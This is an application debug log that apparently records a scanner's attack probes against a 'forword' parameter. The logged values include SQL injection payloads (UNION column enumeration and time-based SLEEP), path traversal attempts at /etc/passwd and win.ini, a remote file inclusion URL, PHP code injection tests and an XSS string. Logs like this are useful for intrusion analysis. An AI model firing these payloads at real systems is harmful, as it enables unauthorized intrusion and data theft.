[2015-10-17 23:08:45][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:45][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:45][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:46][debug] forword：/etc/passwd
[2015-10-17 23:08:46][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:46][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:47][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:47][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:48][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:48][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:49][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:49][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:50][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:50][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:51][debug] forword：0
[2015-10-17 23:08:51][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:51][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:52][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:52][debug] forword：../../../../../../../../etc/passwd
[2015-10-17 23:08:52][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:53][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:53][debug] forword：0
[2015-10-17 23:08:53][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:53][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:54][debug] forword：../../../../../../../../etc/passwd .jpg
[2015-10-17 23:08:54][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:54][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:55][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:55][debug] forword：0
[2015-10-17 23:08:55][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:56][debug] forword：../../../../../../../../../../etc/passwd%00
[2015-10-17 23:08:56][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:56][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:57][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:57][debug] forword：0
[2015-10-17 23:08:57][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:58][debug] forword：../../../../../../../../windows/win.ini
[2015-10-17 23:08:58][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:58][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:59][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:59][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:00][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:00][debug] forword：0
[2015-10-17 23:09:00][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:01][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:01][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:02][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:02][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:03][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:03][debug] forword：../../../../../../../../windows/win.ini .jpg
[2015-10-17 23:09:03][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:03][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:04][debug] forword：0
[2015-10-17 23:09:04][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:09:04][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:09:05][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:09:05][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:09:06][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:06][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:07][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:07][debug] forword：http://120.26.55.211/s.txt
[2015-10-17 23:09:07][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:08][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:08][debug] forword：0
[2015-10-17 23:09:08][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:09][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:09][debug] forword：http://120.26.55.211/s.txt
[2015-10-17 23:09:09][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:10][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:10][debug] forword：0
[2015-10-17 23:09:10][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:11][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:11][debug] forword：a_long_name_file_not_exist
[2015-10-17 23:09:11][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:12][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:12][debug] forword：0
[2015-10-17 23:09:12][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:09:12][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:09:13][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:09:13][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:09:14][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:14][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:15][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:15][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:16][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:16][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:17][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:17][debug] forword：0
[2015-10-17 23:09:17][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:18][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:18][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:19][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:19][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:19][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:20][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:20][debug] forword：0
[2015-10-17 23:09:20][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:09:21][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:09:21][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:09:22][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:09:22][debug] forword：
[2015-10-17 23:09:22][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:09:23][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:23][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:24][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:24][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:25][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:25][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:26][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:26][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:27][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:27][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:28][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:09:28][debug] forword：0 AND SLEEP(5)
[2015-10-17 23:09:28][debug] forword：0 AND SLEEP(5) #
[2015-10-17 23:09:29][debug] forword：0; SELECT PG_SLEEP(5)--
[2015-10-17 23:09:29][debug] forword：0; SELECT SLEEP(5)-- 
[2015-10-17 23:09:30][debug] forword：0'; SELECT SLEEP(5)-- 
[2015-10-17 23:09:30][debug] forword：0) AND SLEEP(5) #
[2015-10-17 23:09:31][debug] forword：0'; SELECT SLEEP(5)--
[2015-10-17 23:09:31][debug] forword：0 WAITFOR DELAY '0:0:5'--
[2015-10-17 23:09:32][debug] forword：0
[2015-10-17 23:09:32][debug] forword：${@print(md5(this_is_a_test_string))}
[2015-10-17 23:09:32][debug] forword：0
[2015-10-17 23:09:33][debug] forword：0
[2015-10-17 23:09:33][debug] forword：0
[2015-10-17 23:09:33][debug] forword：0
[2015-10-17 23:09:34][debug] forword：0
[2015-10-17 23:09:34][debug] forword：${@print(md5(this_is_a_test_string))}\
[2015-10-17 23:09:34][debug] forword：0
[2015-10-17 23:09:35][debug] forword：0
[2015-10-17 23:09:35][debug] forword：0
[2015-10-17 23:09:35][debug] forword：0
[2015-10-17 23:09:36][debug] forword：0
[2015-10-17 23:09:36][debug] forword：print(md5(this_is_a_test_string));die();/*
[2015-10-17 23:09:36][debug] forword：0
[2015-10-17 23:09:36][debug] forword：0
[2015-10-17 23:09:37][debug] forword：0
[2015-10-17 23:09:37][debug] forword：0
[2015-10-17 23:09:37][debug] forword：0
[2015-10-17 23:09:38][debug] forword：0
[2015-10-17 23:09:38][debug] forword：0
[2015-10-17 23:09:39][debug] forword：'"><scRipt>alert(98733)</sCript>
[2015-10-17 23:09:39][debug] forword：0
[2015-10-17 23:09:39][debug] forword：0
[2015-10-17 23:09:40][debug] forword：0
[2015-10-17 23:09:40][debug] forword：0
[2015-10-17 23:09:40][debug] forword：0
[2015-10-17 23:09:41][debug] forword：0
[2015-10-17 23:09:41][debug] forword：0
[2015-10-17 23:09:42][debug] forword：0
[2015-10-17 23:09:42][debug] forword：0
[2015-10-17 23:09:43][debug] forword：0
[2015-10-17 23:09:43][debug] forword：0
[2015-10-17 23:09:44][debug] forword：0
[2015-10-17 23:09:44][debug] forword：0
[2015-10-17 23:09:44][debug] forword：0
[2015-10-17 23:09:45][debug] forword：0
[2015-10-17 23:09:45][debug] forword：0
[2015-10-17 23:09:46][debug] forword：0
[2015-10-17 23:09:46][debug] forword：0
[2015-10-17 23:09:47][debug] forword：0
[2015-10-17 23:09:47][debug] forword：0
[2015-10-17 23:09:48][debug] forword：0
[2015-10-17 23:09:48][debug] forword：0
[2015-10-17 23:09:49][debug] forword：0
[2015-10-17 23:09:49][debug] forword：0
[2015-10-17 23:09:50][debug] forword：0
[2015-10-17 23:09:50][debug] forword：0
[2015-10-17 23:09:51][debug] forword：0
[2015-10-17 23:09:51][debug] forword：0
[2015-10-17 23:09:52][debug] forword：0
[2015-10-17 23:09:52][debug] forword：0
[2015-10-17 23:09:53][debug] forword：0
[2015-10-17 23:09:53][debug] forword：0
[2015-10-17 23:09:53][debug] forword：0
[2015-10-17 23:09:54][debug] forword：0
[2015-10-17 23:09:54][debug] forword：0
[2015-10-17 23:09:55][debug] forword：0
[2015-10-17 23:09:55][debug] forword：0
[2015-10-17 23:09:56][debug] forword：0
[2015-10-17 23:09:56][debug] forword：0
[2015-10-17 23:09:57][debug] forword：0
[2015-10-17 23:09:57][debug] forword：0
[2015-10-17 23:09:58][debug] forword：0
[2015-10-17 23:09:58][debug] forword：0
[2015-10-17 23:09:59][debug] forword：0
[2015-10-17 23:09:59][debug] forword：0
[2015-10-17 23:10:00][debug] forword：0
[2015-10-17 23:10:00][debug] forword：0
[2015-10-17 23:10:00][debug] forword：0
[2015-10-17 23:10:01][debug] forword：0
[2015-10-17 23:10:01][debug] forword：0
[2015-10-17 23:10:02][debug] forword：0
[2015-10-17 23:10:02][debug] forword：0
[2015-10-17 23:10:03][debug] forword：0
[2015-10-17 23:10:03][debug] forword：0
[2015-10-17 23:10:04][debug] forword：0
[2015-10-17 23:10:04][debug] forword：0
[2015-10-17 23:10:05][debug] forword：0
[2015-10-17 23:10:05][debug] forword：0
[2015-10-17 23:10:06][debug] forword：0
[2015-10-17 23:10:06][debug] forword：0
[2015-10-17 23:10:07][debug] forword：0
[2015-10-17 23:10:07][debug] forword：0
[2015-10-17 23:10:08][debug] forword：0
[2015-10-17 23:10:08][debug] forword：0
[2015-10-17 23:10:09][debug] forword：0
[2015-10-17 23:10:09][debug] forword：0
[2015-10-17 23:10:09][debug] forword：0
[2015-10-17 23:10:10][debug] forword：0
[2015-10-17 23:10:10][debug] forword：0
[2015-10-17 23:10:11][debug] forword：0
[2015-10-17 23:10:11][debug] forword：0
[2015-10-17 23:10:12][debug] forword：0
[2015-10-17 23:10:12][debug] forword：0
[2015-10-17 23:10:13][debug] forword：0
[2015-10-17 23:10:13][debug] forword：0
[2015-10-17 23:10:14][debug] forword：0
[2015-10-17 23:10:14][debug] forword：0
[2015-10-17 23:10:15][debug] forword：0
[2015-10-17 23:10:15][debug] forword：0
[2015-10-17 23:10:16][debug] forword：0
[2015-10-17 23:10:16][debug] forword：0
[2015-10-17 23:10:17][debug] forword：0
[2015-10-17 23:10:17][debug] forword：0
[2015-10-17 23:10:17][debug] forword：0
[2015-10-17 23:10:18][debug] forword：0
[2015-10-17 23:10:18][debug] forword：0
[2015-10-17 23:10:19][debug] forword：0
[2015-10-17 23:10:19][debug] forword：0
[2015-10-17 23:10:20][debug] forword：0
[2015-10-17 23:10:20][debug] forword：0
[2015-10-17 23:10:21][debug] forword：0
[2015-10-17 23:10:21][debug] forword：0
[2015-10-17 23:10:22][debug] forword：0
[2015-10-17 23:10:22][debug] forword：0
[2015-10-17 23:10:23][debug] forword：0
[2015-10-17 23:10:23][debug] forword：0
[2015-10-17 23:10:24][debug] forword：0
[2015-10-17 23:10:24][debug] forword：0
[2015-10-17 23:10:25][debug] forword：0
[2015-10-17 23:10:25][debug] forword：0
[2015-10-17 23:10:26][debug] forword：0
[2015-10-17 23:10:26][debug] forword：0
[2015-10-17 23:10:26][debug] forword：0
[2015-10-17 23:10:27][debug] forword：0
[2015-10-17 23:10:27][debug] forword：0
[2015-10-17 23:10:28][debug] forword：0
[2015-10-17 23:10:28][debug] forword：0
[2015-10-17 23:10:29][debug] forword：0
[2015-10-17 23:10:29][debug] forword：0
[2015-10-17 23:10:30][debug] forword：0
[2015-10-17 23:10:30][debug] forword：0
[2015-10-17 23:10:31][debug] forword：0
[2015-10-17 23:10:31][debug] forword：0
[2015-10-17 23:10:32][debug] forword：0
[2015-10-17 23:10:32][debug] forword：0
[2015-10-17 23:10:33][debug] forword：0
[2015-10-17 23:10:33][debug] forword：0
[2015-10-17 23:10:34][debug] forword：0
[2015-10-17 23:10:34][debug] forword：0
[2015-10-17 23:10:35][debug] forword：0
[2015-10-17 23:10:35][debug] forword：0
[2015-10-17 23:10:35][debug] forword：0
[2015-10-17 23:10:36][debug] forword：0
[2015-10-17 23:10:36][debug] forword：0
[2015-10-17 23:10:37][debug] forword：0
[2015-10-17 23:10:37][debug] forword：0
[2015-10-17 23:10:38][debug] forword：0
[2015-10-17 23:10:38][debug] forword：0
[2015-10-17 23:10:39][debug] forword：0
[2015-10-17 23:10:39][debug] forword：0
[2015-10-17 23:10:40][debug] forword：0
[2015-10-17 23:10:40][debug] forword：0
[2015-10-17 23:10:41][debug] forword：0
[2015-10-17 23:10:41][debug] forword：0
[2015-10-17 23:10:42][debug] forword：0
[2015-10-17 23:10:42][debug] forword：0
[2015-10-17 23:10:43][debug] forword：0
[2015-10-17 23:10:43][debug] forword：0
[2015-10-17 23:10:43][debug] forword：0
[2015-10-17 23:10:44][debug] forword：0
[2015-10-17 23:10:44][debug] forword：0
[2015-10-17 23:10:45][debug] forword：0
[2015-10-17 23:10:45][debug] forword：0
[2015-10-17 23:10:46][debug] forword：0
[2015-10-17 23:10:46][debug] forword：0
[2015-10-17 23:10:47][debug] forword：0
[2015-10-17 23:10:47][debug] forword：0
[2015-10-17 23:10:48][debug] forword：0
[2015-10-17 23:10:48][debug] forword：0
[2015-10-17 23:10:49][debug] forword：0
[2015-10-17 23:10:49][debug] forword：0
[2015-10-17 23:10:50][debug] forword：0
[2015-10-17 23:10:50][debug] forword：0
[2015-10-17 23:10:51][debug] forword：0
[2015-10-17 23:10:51][debug] forword：0
[2015-10-17 23:10:51][debug] forword：0
[2015-10-17 23:10:52][debug] forword：0
[2015-10-17 23:10:52][debug] forword：0
[2015-10-17 23:10:53][debug] forword：0
[2015-10-17 23:10:53][debug] forword：0
[2015-10-17 23:10:54][debug] forword：0
[2015-10-17 23:10:54][debug] forword：0
[2015-10-17 23:10:55][debug] forword：0
[2015-10-17 23:10:55][debug] forword：0
[2015-10-17 23:10:56][debug] forword：0
[2015-10-17 23:10:56][debug] forword：0
[2015-10-17 23:10:57][debug] forword：0
[2015-10-17 23:10:57][debug] forword：0
[2015-10-17 23:10:58][debug] forword：0
[2015-10-17 23:10:58][debug] forword：0
[2015-10-17 23:10:59][debug] forword：0
[2015-10-17 23:10:59][debug] forword：0
[2015-10-17 23:11:00][debug] forword：0
[2015-10-17 23:11:00][debug] forword：0
[2015-10-17 23:11:00][debug] forword：0
[2015-10-17 23:11:01][debug] forword：0
[2015-10-17 23:11:01][debug] forword：0
[2015-10-17 23:11:02][debug] forword：0
